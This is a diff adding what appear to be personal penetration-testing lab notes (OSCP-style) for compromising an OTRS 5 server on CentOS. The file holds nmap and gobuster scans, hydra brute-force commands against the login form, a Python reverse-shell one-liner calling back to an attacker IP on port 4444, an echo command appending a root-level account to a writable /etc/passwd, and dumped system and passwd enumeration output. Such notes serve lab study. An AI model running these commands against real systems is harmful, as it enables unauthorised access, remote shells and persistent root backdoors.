@@ -1,0 +1,87 @@
+nmap -sC -sV -Pn 10.11.1.39 > nmap.txt
+nmap 10.11.1.39 > nmapall.txt
+gobuster dir  -u http://10.11.1.39 / -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi  > gobuster.txt
+gobuster dir  -u http://10.11.1.39/otrs -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi  > gobusterotrs.txt
+
+
+
+hydra -l root@localhost -P /home/kali/timmy/oscp2/10.11.1.39/userlist 10.11.1.39 http-post-form "/otrs/index.pl:username=^User^&Password=^PASS^:Login failed"
+hydra -l root@localhost -P /home/kali/timmy/oscp2/10.11.1.39/userlist 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&username=^User^&Password=^PASS^:Login failed"
+hydra -l root@localhost -P /home/kali/timmy/oscp2/10.11.1.39/passlist 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&username=^User^&Password=^PASS^:Login failed"
+hydra -l root@localhost -P /SecLists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&username=^User^&Password=^PASS^:Login failed"
+hydra -l CentOS -P /home/kali/timmy/oscp2/10.11.1.39/passlist 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&username=^User^&Password=^PASS^:Login failed"
+
+-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.134",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+mysql  Ver 15.1 Distrib 5.5.44-MariaDB, for Linux (x86_64) using readline 5.1
+
+1.nmap掃描發現有80端口,用gobuster發現有robots.txt及bad.txt
+2.嘗試訪問發現提示不是search engine所以拒絕,上網查詢常見spinder名稱
+3.使用burp替換user-agent後可成功訪問(注意替換時不行的話,可能是格式問題,切換到header格式替換)
+4.發現以下路徑,訪問後發現是OTRS5服務/otrs/index.pl
+5.上網搜索otrs5 default帳號密碼,發現root@localhost,root
+6.使用burp嘗試帳號root@localhost密碼otrs(密碼由cewl獲取頁面訊息生成)
+7.進入後台後根據43853.txt可以取得reverse shell
+8.查看/etc/passwd權限可以修改,利用echo 添加帳號密碼登入
+
+echo 'jimmy:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+[-] Kernel information:
+Linux leftturn.thinc 3.10.0-327.4.5.el7.x86_64 #1 SMP Mon Jan 25 22:07:14 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 3.10.0-327.4.5.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.3 20140911 (Red Hat 4.8.3-9) (GCC) ) #1 SMP Mon Jan 25 22:07:14 UTC 2016
+
+
+[-] Specific release information:
+CentOS Linux release 7.2.1511 (Core)
+NAME="CentOS Linux"
+VERSION="7 (Core)"
+ID="centos"
+ID_LIKE="rhel fedora"
+VERSION_ID="7"
+PRETTY_NAME="CentOS Linux 7 (Core)"
+ANSI_COLOR="0;31"
+CPE_NAME="cpe:/o:centos:centos:7"
+HOME_URL="https://www.centos.org/"
+BUG_REPORT_URL="https://bugs.centos.org/"
+
+CENTOS_MANTISBT_PROJECT="CentOS-7"
+CENTOS_MANTISBT_PROJECT_VERSION="7"
+REDHAT_SUPPORT_PRODUCT="centos"
+REDHAT_SUPPORT_PRODUCT_VERSION="7"
+
+CentOS Linux release 7.2.1511 (Core)
+CentOS Linux release 7.2.1511 (Core)
+
+
+[-] Hostname:
+leftturn.thinc
+
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+jerry:x:1003:1003:jerry:/var/jerry:/bin/bash
+systemd-bus-proxy:x:998:996:systemd Bus Proxy:/:/sbin/nologin
+systemd-network:x:997:995:systemd Network Management:/:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+otrs:x:1004:1004:OTRS user:/opt/otrs/:/bin/bash
+nginx:x:996:993:Nginx web server:/var/lib/nginx:/sbin/nologin
